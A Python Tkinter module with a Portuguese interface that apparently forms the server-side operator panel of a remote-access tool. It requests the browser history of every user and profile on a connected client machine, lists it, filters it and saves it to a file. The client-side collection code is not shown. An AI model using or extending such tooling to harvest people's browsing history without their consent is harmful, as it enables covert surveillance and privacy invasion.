# server/gui/browser_history_view.py
import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
import threading
import json
import logging
import time
import os
from datetime import datetime
logger = logging.getLogger("server.browser_history_view")
class BrowserHistoryWindow:
    def __init__(self, parent, client_address, client_key, server, log_callback):
        self.parent = parent
        self.client_address = client_address
        self.client_key = client_key
        self.server = server
        self.log = log_callback
        self.is_closing = False
        self.history_data = None
        self.window = tk.Toplevel(parent)
        self.window.title(f"Histórico de Navegação - {client_key}")
        self.window.geometry("1000x700")
        self.window.minsize(800, 600)
        self._create_history_window()
        self.window.protocol("WM_DELETE_WINDOW", self._on_close)
        self._request_browser_history()
    def _create_history_window(self):
        main_frame = ttk.Frame(self.window, padding=10)
        main_frame.pack(fill=tk.BOTH, expand=True)
        control_frame = ttk.Frame(main_frame)
        control_frame.pack(fill=tk.X, pady=(0, 10))
        self.refresh_button = ttk.Button(
            control_frame,
            text="Atualizar",
            command=self._request_browser_history
        )
        self.refresh_button.pack(side=tk.LEFT, padx=(0, 10))
        self.save_button = ttk.Button(
            control_frame,
            text="Salvar para Arquivo",
            command=self._save_history_to_file
        )
        self.save_button.pack(side=tk.LEFT, padx=5)
        self.show_all_var = tk.BooleanVar(value=False)
        self.show_all_check = ttk.Checkbutton(
            control_frame,
            text="Mostrar todos juntos",
            variable=self.show_all_var,
            command=self._toggle_show_all
        )
        self.show_all_check.pack(side=tk.LEFT, padx=(20, 5))
        ttk.Label(control_frame, text="Perfil:").pack(side=tk.LEFT, padx=(20, 5))
        self.profile_var = tk.StringVar()
        self.profile_combo = ttk.Combobox(control_frame, textvariable=self.profile_var, state="readonly", width=40)
        self.profile_combo.pack(side=tk.LEFT, padx=5)
        self.profile_combo.bind("<<ComboboxSelected>>", self._on_profile_selected)
        filter_frame = ttk.Frame(main_frame)
        filter_frame.pack(fill=tk.X, pady=(0, 10))
        ttk.Label(filter_frame, text="Filtrar:").pack(side=tk.LEFT, padx=(0, 5))
        self.filter_entry = ttk.Entry(filter_frame, width=30)
        self.filter_entry.pack(side=tk.LEFT, padx=5)
        self.filter_entry.bind("<Return>", lambda e: self._apply_filter())
        self.filter_button = ttk.Button(
            filter_frame,
            text="Aplicar Filtro",
            command=self._apply_filter
        )
        self.filter_button.pack(side=tk.LEFT, padx=5)
        self.clear_filter_button = ttk.Button(
            filter_frame,
            text="Limpar Filtro",
            command=self._clear_filter
        )
        self.clear_filter_button.pack(side=tk.LEFT, padx=5)
        history_frame = ttk.Frame(main_frame)
        history_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
        columns = ("timestamp", "title", "url", "browser", "profile")
        self.history_tree = ttk.Treeview(
            history_frame, 
            columns=columns, 
            show="headings", 
            selectmode="browse"
        )
        self.history_tree.heading("timestamp", text="Data/Hora", command=lambda: self._sort_history("timestamp"))
        self.history_tree.heading("title", text="Título", command=lambda: self._sort_history("title"))
        self.history_tree.heading("url", text="URL", command=lambda: self._sort_history("url"))
        self.history_tree.heading("browser", text="Navegador", command=lambda: self._sort_history("browser"))
        self.history_tree.heading("profile", text="Perfil", command=lambda: self._sort_history("profile"))
        self.history_tree.column("timestamp", width=150, minwidth=150)
        self.history_tree.column("title", width=350, minwidth=200)
        self.history_tree.column("url", width=450, minwidth=200)
        self.history_tree.column("browser", width=100, minwidth=80)
        self.history_tree.column("profile", width=120, minwidth=80)
        vsb = ttk.Scrollbar(history_frame, orient="vertical", command=self.history_tree.yview)
        hsb = ttk.Scrollbar(history_frame, orient="horizontal", command=self.history_tree.xview)
        self.history_tree.configure(yscrollcommand=vsb.set, xscrollcommand=hsb.set)
        self.history_tree.pack(side=tk.TOP, fill=tk.BOTH, expand=True)
        hsb.pack(side=tk.BOTTOM, fill=tk.X)
        vsb.pack(side=tk.RIGHT, fill=tk.Y)
        self._create_context_menu()
        self.history_tree.bind("<Button-3>", self._show_context_menu)
        self.history_tree.bind("<Double-1>", self._on_double_click)
        log_frame = ttk.LabelFrame(main_frame, text="Log de Coleção")
        log_frame.pack(fill=tk.X, expand=False, pady=(10, 0))
        self.log_text = scrolledtext.ScrolledText(
            log_frame, 
            wrap=tk.WORD, 
            height=6, 
            font=("Consolas", 9)
        )
        self.log_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.log_text.config(state=tk.DISABLED)
        status_frame = ttk.Frame(self.window, relief=tk.SUNKEN, padding=(5, 2))
        status_frame.pack(side=tk.BOTTOM, fill=tk.X)
        self.status_var = tk.StringVar(value="Pronto")
        self.status_label = ttk.Label(status_frame, textvariable=self.status_var, anchor=tk.W)
        self.status_label.pack(side=tk.LEFT, fill=tk.X, expand=True)
        self.count_var = tk.StringVar(value="0 itens")
        self.count_label = ttk.Label(status_frame, textvariable=self.count_var, anchor=tk.E)
        self.count_label.pack(side=tk.RIGHT)
    def _create_context_menu(self):
        self.context_menu = tk.Menu(self.window, tearoff=0)
        self.context_menu.add_command(label="Copiar URL", command=self._copy_url)
        self.context_menu.add_command(label="Copiar Título", command=self._copy_title)
        self.context_menu.add_command(label="Copiar Data/Hora", command=self._copy_timestamp)
        self.context_menu.add_command(label="Copiar Navegador", command=self._copy_browser)
        self.context_menu.add_command(label="Copiar Perfil", command=self._copy_profile)
        self.context_menu.add_separator()
        self.context_menu.add_command(label="Copiar Linha Completa", command=self._copy_full_line)
    def _show_context_menu(self, event):
        try:
            item = self.history_tree.identify_row(event.y)
            if item:
                self.history_tree.selection_set(item)
                self.history_tree.focus(item)
                self.context_menu.post(event.x_root, event.y_root)
        except Exception as e:
            logger.error(f"Erro ao mostrar menu de contexto: {str(e)}")
    def _copy_url(self):
        try:
            selected = self.history_tree.selection()
            if selected:
                url = self.history_tree.item(selected[0], "values")[2]
                self.window.clipboard_clear()
                self.window.clipboard_append(url)
                self.status_var.set("URL copiada para a área de transferência")
        except Exception as e:
            logger.error(f"Erro ao copiar URL: {str(e)}")
    def _copy_title(self):
        try:
            selected = self.history_tree.selection()
            if selected:
                title = self.history_tree.item(selected[0], "values")[1]
                self.window.clipboard_clear()
                self.window.clipboard_append(title)
                self.status_var.set("Título copiado para a área de transferência")
        except Exception as e:
            logger.error(f"Erro ao copiar título: {str(e)}")
    def _copy_timestamp(self):
        try:
            selected = self.history_tree.selection()
            if selected:
                timestamp = self.history_tree.item(selected[0], "values")[0]
                self.window.clipboard_clear()
                self.window.clipboard_append(timestamp)
                self.status_var.set("Data/Hora copiada para a área de transferência")
        except Exception as e:
            logger.error(f"Erro ao copiar timestamp: {str(e)}")
    def _copy_browser(self):
        try:
            selected = self.history_tree.selection()
            if selected:
                values = self.history_tree.item(selected[0], "values")
                if len(values) > 3:  # Certifique-se de que há informações de navegador
                    browser = values[3]
                    self.window.clipboard_clear()
                    self.window.clipboard_append(browser)
                    self.status_var.set("Navegador copiado para a área de transferência")
        except Exception as e:
            logger.error(f"Erro ao copiar navegador: {str(e)}")
    def _copy_profile(self):
        try:
            selected = self.history_tree.selection()
            if selected:
                values = self.history_tree.item(selected[0], "values")
                if len(values) > 4:  # Certifique-se de que há informações de perfil
                    profile = values[4]
                    self.window.clipboard_clear()
                    self.window.clipboard_append(profile)
                    self.status_var.set("Perfil copiado para a área de transferência")
        except Exception as e:
            logger.error(f"Erro ao copiar perfil: {str(e)}")
    def _copy_full_line(self):
        try:
            selected = self.history_tree.selection()
            if selected:
                values = self.history_tree.item(selected[0], "values")
                if len(values) > 4:  # Com as colunas adicionais de navegador e perfil
                    full_text = f"[{values[0]}] {values[3]}/{values[4]} - {values[1]} - {values[2]}"
                else:
                    full_text = f"[{values[0]}] {values[1]} - {values[2]}"
                self.window.clipboard_clear()
                self.window.clipboard_append(full_text)
                self.status_var.set("Linha completa copiada para a área de transferência")
        except Exception as e:
            logger.error(f"Erro ao copiar linha completa: {str(e)}")
    def _on_double_click(self, event):
        self._copy_url()
    def _request_browser_history(self):
        if self.is_closing:
            return
        self.refresh_button.config(state=tk.DISABLED)
        self.save_button.config(state=tk.DISABLED)
        try:
            self.status_var.set("Solicitando histórico de navegação...")
            self._log("Solicitando histórico de navegação do cliente")
            if self.client_address not in self.server.connection_manager.client_handlers:
                self._log("Erro: Cliente não conectado")
                self.status_var.set("Erro: Cliente não conectado")
                messagebox.showerror("Erro", "Cliente não está conectado.", parent=self.window)
                self.refresh_button.config(state=tk.NORMAL)
                self.save_button.config(state=tk.NORMAL)
                return
            client_handler = self.server.connection_manager.client_handlers[self.client_address]
            from core.protocol import CMD_BROWSER_HISTORY_REQUEST
            success = client_handler._send_binary_command(CMD_BROWSER_HISTORY_REQUEST)
            if not success:
                self._log("Erro: Falha ao enviar solicitação de histórico")
                self.status_var.set("Erro: Falha ao solicitar histórico")
                messagebox.showerror("Erro", "Falha ao solicitar histórico de navegação.", parent=self.window)
                self.refresh_button.config(state=tk.NORMAL)
                self.save_button.config(state=tk.NORMAL)
                return
            self._log("Solicitação enviada. Aguardando resposta...")
        except Exception as e:
            self._log(f"Erro ao solicitar histórico: {str(e)}")
            self.status_var.set(f"Erro: {str(e)}")
            self.refresh_button.config(state=tk.NORMAL)
            self.save_button.config(state=tk.NORMAL)
    def process_history_data(self, data):
        if self.is_closing:
            return
        try:
            self._log("Recebidos dados de histórico de navegação")
            history_json = json.loads(data.decode('utf-8'))
            if isinstance(history_json, dict) and "error" in history_json:
                error_msg = history_json["error"]
                self._log(f"Erro recebido do cliente: {error_msg}")
                self.status_var.set(f"Erro: {error_msg}")
                messagebox.showerror("Erro", f"Erro ao coletar histórico: {error_msg}", parent=self.window)
                self.refresh_button.config(state=tk.NORMAL)
                self.save_button.config(state=tk.NORMAL)
                return
            self.history_data = history_json
            self._update_profile_list()
            self.refresh_button.config(state=tk.NORMAL)
            self.save_button.config(state=tk.NORMAL)
        except json.JSONDecodeError:
            self._log("Erro: Dados de histórico inválidos (não é um JSON válido)")
            self.status_var.set("Erro: Dados de histórico inválidos")
            self.refresh_button.config(state=tk.NORMAL)
            self.save_button.config(state=tk.NORMAL)
        except Exception as e:
            self._log(f"Erro ao processar dados de histórico: {str(e)}")
            self.status_var.set(f"Erro: {str(e)}")
            self.refresh_button.config(state=tk.NORMAL)
            self.save_button.config(state=tk.NORMAL)
    def _update_profile_list(self):
        if not self.history_data:
            return
        try:
            profiles = list(self.history_data.keys())
            if not profiles:
                self._log("Nenhum perfil de navegador encontrado")
                self.status_var.set("Nenhum histórico de navegação encontrado")
                self.profile_combo['values'] = []
                self.count_var.set("0 itens")
                return
            profiles.sort()
            self.profile_combo['values'] = profiles
            self.show_all_check.config(state=tk.NORMAL)
            if self.show_all_var.get():
                self.profile_combo.config(state="disabled")
                self._display_all_history()
                self._log(f"Exibindo histórico combinado de {len(profiles)} perfis")
            else:
                self.profile_combo.config(state="readonly")
                self.profile_combo.current(0)
                self._on_profile_selected()
            total_items = 0
            for profile in profiles:
                total_items += len(self.history_data[profile])
            self._log(f"Encontrados {len(profiles)} perfis de navegador com {total_items} entradas de histórico")
            self.status_var.set(f"{len(profiles)} perfis de navegador encontrados")
        except Exception as e:
            self._log(f"Erro ao atualizar lista de perfis: {str(e)}")
            self.status_var.set(f"Erro: {str(e)}")
    def _toggle_show_all(self):
        if self.show_all_var.get():
            self.profile_combo.config(state="disabled")
            self._log("Exibindo histórico combinado de todos os navegadores")
            self._display_all_history(self.filter_entry.get().strip())
        else:
            self.profile_combo.config(state="readonly")
            selected_profile = self.profile_var.get()
            if selected_profile and self.history_data and selected_profile in self.history_data:
                self._display_profile_history(selected_profile, self.filter_entry.get().strip())
            else:
                for item in self.history_tree.get_children():
                    self.history_tree.delete(item)
                self.count_var.set("0 itens")
    def _on_profile_selected(self, event=None):
        if not self.history_data:
            return
        if self.show_all_var.get():
            return
        try:
            selected_profile = self.profile_var.get()
            if not selected_profile or selected_profile not in self.history_data:
                for item in self.history_tree.get_children():
                    self.history_tree.delete(item)
                self.count_var.set("0 itens")
                return
            self._display_profile_history(selected_profile)
        except Exception as e:
            self._log(f"Erro ao carregar perfil selecionado: {str(e)}")
            self.status_var.set(f"Erro: {str(e)}")
    def _display_all_history(self, filter_text=None):
        try:
            for item in self.history_tree.get_children():
                self.history_tree.delete(item)
            all_items = []
            total_original_items = 0
            for profile, items in self.history_data.items():
                user, browser, profile_name = profile.split("|")
                for item in items:
                    enriched_item = item.copy()
                    enriched_item["browser"] = browser
                    enriched_item["profile"] = f"{user}/{profile_name}"
                    enriched_item["profile_key"] = profile
                    all_items.append(enriched_item)
                total_original_items += len(items)
            all_items.sort(key=lambda x: x.get("timestamp", ""), reverse=True)
            if filter_text:
                filter_lower = filter_text.lower()
                filtered_items = []
                for item in all_items:
                    if (filter_lower in item.get("title", "").lower() or 
                        filter_lower in item.get("url", "").lower() or
                        filter_lower in item.get("browser", "").lower() or
                        filter_lower in item.get("profile", "").lower()):
                        filtered_items.append(item)
                items_to_display = filtered_items
            else:
                items_to_display = all_items
            for item in items_to_display:
                timestamp = item.get("timestamp", "")
                title = item.get("title", "")
                url = item.get("url", "")
                browser = item.get("browser", "")
                profile = item.get("profile", "")
                self.history_tree.insert(
                    "",
                    tk.END,
                    values=(timestamp, title, url, browser, profile)
                )
            item_count = len(items_to_display)
            if filter_text:
                self.count_var.set(f"{item_count} de {len(all_items)} itens")
                self.status_var.set(f"Filtro '{filter_text}' aplicado: {item_count} itens encontrados")
            else:
                self.count_var.set(f"{item_count} itens")
                self.status_var.set(f"Exibindo histórico combinado de {len(self.history_data)} perfis: {item_count} itens")
        except Exception as e:
            self._log(f"Erro ao exibir histórico combinado: {str(e)}")
            self.status_var.set(f"Erro: {str(e)}")
    def _display_profile_history(self, profile, filter_text=None):
        try:
            for item in self.history_tree.get_children():
                self.history_tree.delete(item)
            history_items = self.history_data[profile]
            user, browser, profile_name = profile.split("|")
            if filter_text:
                filter_lower = filter_text.lower()
                filtered_items = []
                for item in history_items:
                    if (filter_lower in item.get("title", "").lower() or 
                        filter_lower in item.get("url", "").lower()):
                        filtered_items.append(item)
                items_to_display = filtered_items
            else:
                items_to_display = history_items
            for item in items_to_display:
                timestamp = item.get("timestamp", "")
                title = item.get("title", "")
                url = item.get("url", "")
                self.history_tree.insert(
                    "",
                    tk.END,
                    values=(timestamp, title, url, browser, profile_name)
                )
            item_count = len(items_to_display)
            if filter_text:
                self.count_var.set(f"{item_count} de {len(history_items)} itens")
                self.status_var.set(f"Filtro '{filter_text}' aplicado: {item_count} itens encontrados")
            else:
                self.count_var.set(f"{item_count} itens")
                self.status_var.set(f"Exibindo histórico do perfil '{profile}': {item_count} itens")
        except Exception as e:
            self._log(f"Erro ao exibir histórico do perfil: {str(e)}")
            self.status_var.set(f"Erro: {str(e)}")
    def _apply_filter(self):
        filter_text = self.filter_entry.get().strip()
        if not filter_text:
            self._clear_filter()
            return
        if self.show_all_var.get():
            self._display_all_history(filter_text)
        else:
            selected_profile = self.profile_var.get()
            if not selected_profile or not self.history_data or selected_profile not in self.history_data:
                return
            self._display_profile_history(selected_profile, filter_text)
    def _clear_filter(self):
        self.filter_entry.delete(0, tk.END)
        if self.show_all_var.get():
            self._display_all_history()
        else:
            selected_profile = self.profile_var.get()
            if selected_profile and self.history_data and selected_profile in self.history_data:
                self._display_profile_history(selected_profile)
    def _sort_history(self, column):
        self._log(f"Ordenando por {column}")
        if self.show_all_var.get():
            self._display_all_history(self.filter_entry.get().strip())
        else:
            selected_profile = self.profile_var.get()
            if selected_profile and self.history_data and selected_profile in self.history_data:
                self._display_profile_history(selected_profile, self.filter_entry.get().strip())
    def _save_history_to_file(self):
        if not self.history_data:
            messagebox.showinfo("Informação", "Não há dados de histórico para salvar.", parent=self.window)
            return
        try:
            now = datetime.now().strftime("%Y%m%d_%H%M%S")
            default_filename = f"historico_navegadores_{self.client_key.replace(':', '_')}_{now}.txt"
            filepath = filedialog.asksaveasfilename(
                parent=self.window,
                initialfile=default_filename,
                defaultextension=".txt",
                filetypes=[("Arquivos de texto", "*.txt"), ("Todos os arquivos", "*.*")]
            )
            if not filepath:
                return
            with open(filepath, "w", encoding="utf-8") as f:
                f.write(f"==== Histórico de Navegação para {self.client_key} ====\n")
                f.write(f"Data de coleta: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                for profile in sorted(self.history_data.keys()):
                    items = self.history_data[profile]
                    user, browser, profile_name = profile.split("|")
                    f.write(f"\n\n===== {browser.upper()} | USUÁRIO: {user} | PERFIL: {profile_name} =====\n")
                    for item in items:
                        timestamp = item.get("timestamp", "")
                        title = item.get("title", "")
                        url = item.get("url", "")
                        f.write(f"[{timestamp}] {title} -> {url}\n")
            self._log(f"Histórico salvo em: {filepath}")
            self.status_var.set(f"Histórico salvo em: {os.path.basename(filepath)}")
            messagebox.showinfo("Sucesso", f"Histórico salvo em:\n{filepath}", parent=self.window)
        except Exception as e:
            self._log(f"Erro ao salvar histórico: {str(e)}")
            self.status_var.set(f"Erro ao salvar: {str(e)}")
            messagebox.showerror("Erro", f"Erro ao salvar histórico: {str(e)}", parent=self.window)
    def _log(self, message):
        timestamp = datetime.now().strftime("%H:%M:%S")
        log_message = f"[{timestamp}] {message}\n"
        self.log_text.config(state=tk.NORMAL)
        self.log_text.insert(tk.END, log_message)
        self.log_text.see(tk.END)
        self.log_text.config(state=tk.DISABLED)
        self.log(message)
    def _on_close(self):
        self.is_closing = True
        try:
            self.window.destroy()
        except:
            pass
        self.log(f"Janela de histórico de navegação fechada para {self.client_key}")
